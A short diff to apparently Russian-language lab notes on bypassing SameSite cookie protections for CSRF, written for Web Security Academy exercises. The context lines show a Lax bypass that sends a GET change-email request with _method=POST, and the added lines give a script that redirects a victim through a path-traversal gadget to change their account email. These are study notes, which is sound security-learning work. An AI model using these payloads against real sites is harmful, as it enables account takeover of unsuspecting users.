@@ -25,3 +25,9 @@ BYPASS Lax работает только по GET
 
 Но если поменяем метод с POST на GET, может быть респонс method is not allowed, для обхода нужно добавить параметр _method=POST
 GET /my-account/change-email?email=sssss%40m.ru&_method=POST 
+
+---------------------------------------------------------------------------
+БАЙПАСИМ SameSite: Strict
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
